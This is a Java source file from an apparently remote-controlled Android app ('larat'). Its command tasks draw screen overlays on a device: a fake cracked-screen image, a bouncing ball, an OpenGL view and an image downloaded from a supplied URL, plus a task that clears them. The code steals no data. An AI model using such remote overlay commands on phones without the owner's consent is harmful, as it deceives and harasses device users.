package com.c4wd.commands;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.opengl.GLSurfaceView;
import android.os.AsyncTask;
import android.view.Display;
import android.view.Gravity;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.widget.ImageView;

import com.c4wd.drawing.BouncingBall;
import com.c4wd.drawing.OpenGLRenderer;
import com.c4wd.drawing.OverlayService;
import com.c4wd.larat.LaratException;
import com.c4wd.larat.R;

import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

/**
 * Created by cory on 10/7/15.
 */
public class DrawingTasks {

    private static final int LayoutParamFlags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
            | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
            | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;


    public static class OpenGLViewTask extends AsyncTask<Object, Void, Void> {

        private CommandContext context;

        @Override
        protected Void doInBackground(Object... objects) {
            this.context = (CommandContext)(objects[0]);
            return null;
        }

        @Override
        protected void onPostExecute(Void returnValue) {
            OverlayService overlayService = new OverlayService(context.getContext());

            GLSurfaceView view = new GLSurfaceView(context.getContext());
            view.setEGLConfigChooser(8, 8, 8, 8, 16, 0);
            view.getHolder().setFormat(PixelFormat.TRANSLUCENT);
            view.setRenderer(new OpenGLRenderer());
            ViewGroup.LayoutParams layoutParams = new ViewGroup.LayoutParams(80, 80);
            view.setLayoutParams(layoutParams);

            overlayService.addView(view);
        }

    }

    public static class PongTask extends AsyncTask<Object, Void, Void> {

        private CommandContext context;

        @Override
        protected Void doInBackground(Object... objects) {
            this.context = (CommandContext)(objects[0]);
            return null;
        }

        @Override
        protected void onPostExecute(Void returnValue) {
            OverlayService overlayService = new OverlayService(context.getContext());

            BouncingBall view = new BouncingBall(context.getContext());
            view.maxX = overlayService.getWindowManager().getDefaultDisplay().getWidth();
            view.maxY = overlayService.getWindowManager().getDefaultDisplay().getHeight();

            overlayService.addView(view);

            Command.reportResult("Add an instance of Pong");
        }

    }

    public static class CrackScreenTask extends AsyncTask<Object, Void, Void> {

        private CommandContext context;

        @Override
        protected Void doInBackground(Object... objects) {
            this.context = (CommandContext)(objects[0]);
            return null;
        }

        @Override
        protected void onPostExecute(Void returnValue) {
            OverlayService overlayService = new OverlayService(context.getContext());
            overlayService.setGravity(Gravity.CENTER);

            ImageView view = new ImageView(context.getContext());
            Bitmap bm = BitmapFactory.decodeResource(context.getContext().getResources(), R.drawable.crack);
            view.setImageBitmap(bm);
            view.setLayoutParams(new ViewGroup.LayoutParams(100, 100));

            overlayService.addView(view);

            Command.reportResult("Cracked the screen!");
        }
    }

    public static class ClearViewTask extends AsyncTask<Object, Void, Void> {

        private CommandContext context;

        @Override
        protected Void doInBackground(Object... objects) {
            this.context = (CommandContext)(objects[0]);
            return null;
        }

        @Override
        protected void onPostExecute(Void returnValue) {
            OverlayService overlayService = new OverlayService(context.getContext());

            if (context.getArguments().size() == 1) {
                try {
                    overlayService.removeView(Integer.parseInt((String) context.getArgument(0)));
                } catch (Exception ex) {
                    LaratException.reportException(ex);
                }
            } else {
                overlayService.removeAllViews();
            }
            Command.reportResult("Remove view success");
        }

    }

    public static class DrawURLImage extends AsyncTask<Object, Void, Bitmap> {

        private CommandContext context;

        @Override
        protected Bitmap doInBackground(Object... objects) {
            this.context = (CommandContext)objects[0];
            if (this.context.getArguments().size() == 1) {
                return downloadImg((String)this.context.getArgument(0));
            } else {
                Command.reportResult("No URL supplied!");
            }
            return null;
        }

        @Override
        protected void onPostExecute(Bitmap result) {
            if (result != null) {
                OverlayService overlayService = new OverlayService(context.getContext());
                overlayService.setGravity(Gravity.CENTER);
                Display disp = ((WindowManager)(this.context.getContext().getSystemService(Context.WINDOW_SERVICE))).getDefaultDisplay();
                int width = disp.getWidth();
                int desired_width = (int) Math.ceil(width * .85); //we want to be 85% of the screen
                int desired_height = desired_width * result.getHeight() / result.getWidth();
                ImageView view = new ImageView(context.getContext());
                view.setImageBitmap(Bitmap.createScaledBitmap(result, desired_width, desired_height, false));
                view.setLayoutParams(new ViewGroup.LayoutParams(
                        result.getWidth(),
                        result.getHeight()
                    )
                );

                overlayService.addView(view);
            } else {
                Command.reportWarning("Invalid image supplied!");
            }
        }

        private Bitmap downloadImg(String url) {

            Bitmap bmp =null;
            try{
                URL ulrn = new URL(url);
                HttpURLConnection con = (HttpURLConnection)ulrn.openConnection();
                InputStream is = con.getInputStream();
                bmp = BitmapFactory.decodeStream(is);
                if (null != bmp)
                    return bmp;
            }
            catch (MalformedURLException e) {
                Command.reportWarning("Invalid URL supplied!");
            }
            catch(Exception e) {
                LaratException.reportException(e);
            }
            return bmp;
        }
    }
}
